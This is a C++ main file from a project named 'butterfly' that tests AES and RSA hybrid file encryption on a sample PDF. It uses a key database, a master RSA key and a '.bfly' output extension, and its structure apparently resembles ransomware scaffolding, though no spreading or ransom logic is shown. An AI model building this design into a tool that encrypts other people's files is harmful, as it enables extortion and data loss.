
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"
#include "aesKeyDatabase.h"

int main(int argc, char *argv[])
{
    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);


    std::unique_ptr<butterfly::AESKeyDatabase> _database(new butterfly::AESKeyDatabase("AES.db", false));

    _database->print();
    _database->insertEntry("/home/christian/", "abc", "defg");

    _database->print();

    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());

    /*
    /////// Hybrid Part ////////

    // start encryption
    std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
    encryptor->encryptCPrivateRSA();
    encryptor->encryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf");

    encryptor->encryptAESKeyFile("AESKey.txt");


    sleep(5);

    // start decryption
    std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    std::string aesKey = decryptor->decryptAESKey(cprivate, "AESKey.bin");
    decryptor->decryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf", aesKey);

    */
    ////// AES PART ///////
    /*
    std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
    aesEncryptor->generateAESKey();
    std::string aeskey = aesEncryptor->getAESKey();
    std::string aesiv = aesEncryptor->getAESIv();
    butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
    butterfly::writeBinFile("AESIv.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
    std::string s = "/home/christian/projects/butterfly/bin/data/test.pdf";
    aesEncryptor->encryptFile(s);
    */

    /*
    std::unique_ptr<butterfly::aes::AESDecryptor> aesDecryptor(new butterfly::aes::AESDecryptor());
    std::string aeskey = butterfly::readBinFile("AESKey.txt");
    std::string aesiv = butterfly::readBinFile("AESIv.txt");
    aesDecryptor->setAESKey(aeskey);
    aesDecryptor->setAESIv(aesiv);
    std::string s = "/home/christian/projects/butterfly/bin/test.pdf.bfly";
    aesDecryptor->decryptFile(s);
    */
    
     return 0;
}